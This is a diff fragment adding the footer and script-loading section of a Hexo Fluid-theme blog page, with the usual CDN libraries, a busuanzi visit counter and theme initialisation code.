+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
